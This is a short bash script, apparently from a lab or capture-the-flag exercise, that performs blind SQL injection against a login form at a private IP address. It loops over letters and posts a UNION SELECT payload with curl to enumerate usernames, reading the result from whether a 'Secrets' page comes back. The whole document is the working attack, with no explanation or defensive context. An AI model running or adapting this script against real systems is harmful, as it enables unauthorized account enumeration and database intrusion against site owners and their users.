for char in {a..z}; do
  echo -n "Checking $char: "
  # If this returns the "Secrets" page, a username starts with this letter
  res=$(curl -s -d "username=nulluser' UNION SELECT 1 FROM users WHERE username != 'user' AND username LIKE '$char%'--&password=x" http://192.168.122.39/secrets)
  if echo "$res" | grep -q "Secrets"; then
    echo "MATCH!"
  else
    echo "no"
  fi
done
